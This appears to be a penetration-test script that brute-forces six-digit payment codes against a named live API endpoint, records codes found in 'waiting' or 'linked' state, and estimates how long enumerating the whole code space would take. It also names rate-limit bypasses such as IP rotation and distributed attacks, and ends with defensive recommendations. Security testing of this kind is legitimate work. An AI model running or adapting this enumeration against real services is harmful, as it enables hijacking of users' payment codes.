#!/usr/bin/env python3
"""Security Test: Code Enumeration Feasibility Assessment"""

import requests
import time
from datetime import datetime
from collections import defaultdict

BASE_URL = "https://solana-blik.vercel.app/api/codes/{}/resolve"
START_CODE = 100000
END_CODE = 100100
TOTAL_CODE_SPACE = 900000

def test_code_enumeration():
    print("=" * 70)
    print("SECURITY TEST: Code Enumeration Feasibility")
    print("=" * 70)
    print(f"Target: {BASE_URL.format("XXXXXX")}")
    print(f"Test Range: {START_CODE} - {END_CODE}")
    print(f"Total Codes to Test: {END_CODE - START_CODE + 1}")
    print(f"Start Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}")
    print("-" * 70)
    
    results = {
        "successful": 0,
        "rate_limited": 0,
        "errors": 0,
        "valid_codes": [],
        "status_codes": defaultdict(int),
        "response_times": []
    }
    
    start_time = time.time()
    
    for code in range(START_CODE, END_CODE + 1):
        try:
            request_start = time.time()
            url = BASE_URL.format(code)
            response = requests.get(url, timeout=10)
            request_duration = time.time() - request_start
            
            results["response_times"].append(request_duration)
            results["status_codes"][response.status_code] += 1
            
            if response.status_code == 200:
                results["successful"] += 1
                try:
                    data = response.json()
                    status = data.get("status", "unknown")
                    if status in ["waiting", "linked"]:
                        results["valid_codes"].append({"code": code, "status": status, "data": data})
                        print(f"✓ Code {code}: {status.upper()} - VALID CODE FOUND!")
                    else:
                        print(f"  Code {code}: {status}")
                except Exception as e:
                    print(f"  Code {code}: HTTP 200 (parse error: {e})")
            elif response.status_code == 429:
                results["rate_limited"] += 1
                print(f"✗ Code {code}: RATE LIMITED (429)")
            elif response.status_code == 404:
                print(f"  Code {code}: Not found")
            else:
                results["errors"] += 1
                print(f"✗ Code {code}: HTTP {response.status_code}")
        except requests.exceptions.Timeout:
            results["errors"] += 1
            print(f"✗ Code {code}: TIMEOUT")
        except Exception as e:
            results["errors"] += 1
            print(f"✗ Code {code}: ERROR - {e}")
    
    end_time = time.time()
    total_duration = end_time - start_time
    total_requests = END_CODE - START_CODE + 1
    requests_per_second = total_requests / total_duration if total_duration > 0 else 0
    avg_response_time = sum(results["response_times"]) / len(results["response_times"]) if results["response_times"] else 0
    
    if requests_per_second > 0:
        full_enumeration_seconds = TOTAL_CODE_SPACE / requests_per_second
        full_enumeration_minutes = full_enumeration_seconds / 60
        full_enumeration_hours = full_enumeration_minutes / 60
    else:
        full_enumeration_seconds = float("inf")
        full_enumeration_minutes = float("inf")
        full_enumeration_hours = float("inf")
    
    print("\n" + "=" * 70)
    print("TEST RESULTS SUMMARY")
    print("=" * 70)
    print(f"Total Requests Sent:        {total_requests}")
    print(f"Successful Requests (200):  {results["successful"]}")
    print(f"Rate Limited (429):         {results["rate_limited"]}")
    print(f"Errors:                     {results["errors"]}")
    print(f"Valid Codes Found:          {len(results["valid_codes"])}")
    print()
    print("Status Code Distribution:")
    for status_code, count in sorted(results["status_codes"].items()):
        print(f"  HTTP {status_code}: {count} requests")
    print()
    print("Performance Metrics:")
    print(f"  Total Time:              {total_duration:.2f} seconds")
    print(f"  Average Response Time:   {avg_response_time:.3f} seconds")
    print(f"  Requests per Second:     {requests_per_second:.2f} req/s")
    print()
    print("=" * 70)
    print("ATTACK FEASIBILITY ANALYSIS")
    print("=" * 70)
    print(f"Total Code Space:           {TOTAL_CODE_SPACE:,} codes (100000-999999)")
    print(f"Measured Rate:              {requests_per_second:.2f} requests/second")
    print()
    if results["rate_limited"] > 0:
        print("⚠️  RATE LIMITING DETECTED!")
        print(f"   {results["rate_limited"]} requests were rate limited (HTTP 429)")
        print(f"   Rate limiting kicked in at: {results["rate_limited"]} / {total_requests} requests")
        print()
    print("Mathematical Proof - Full Enumeration Time:")
    print(f"  At {requests_per_second:.2f} req/s:")
    print(f"    • {TOTAL_CODE_SPACE:,} codes ÷ {requests_per_second:.2f} req/s")
    print(f"    • = {full_enumeration_seconds:,.0f} seconds")
    print(f"    • = {full_enumeration_minutes:,.1f} minutes")
    print(f"    • = {full_enumeration_hours:,.2f} hours")
    print()
    print("=" * 70)
    print("SECURITY VERDICT")
    print("=" * 70)
    if results["rate_limited"] > 0:
        print("⚠️  PARTIALLY VULNERABLE")
        print("   Rate limiting exists but may be bypassable with:")
        print("   - Distributed attack (multiple IPs)")
        print("   - Slower enumeration over longer time period")
        print("   - IP rotation techniques")
    else:
        print("🚨 CRITICALLY VULNERABLE")
        print("   NO RATE LIMITING DETECTED!")
        print("   Full code space enumeration is FEASIBLE!")
    print()
    if len(results["valid_codes"]) > 0:
        print(f"⚠️  VALID CODES DISCOVERED: {len(results["valid_codes"])}")
        print("   Codes found in test range:")
        for valid in results["valid_codes"]:
            print(f"   - Code {valid["code"]}: {valid["status"]}")
        print()
    print("Recommendation:")
    print("  1. Implement strict rate limiting (e.g., 10 requests per minute)")
    print("  2. Add CAPTCHA after N failed attempts")
    print("  3. Use longer, non-sequential code format")
    print("  4. Implement account-level throttling")
    print("  5. Add exponential backoff for repeated attempts")
    print("=" * 70)
    return results

if __name__ == "__main__":
    try:
        results = test_code_enumeration()
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user.")
    except Exception as e:
        print(f"\n\nTest failed with error: {e}")
        import traceback
        traceback.print_exc()
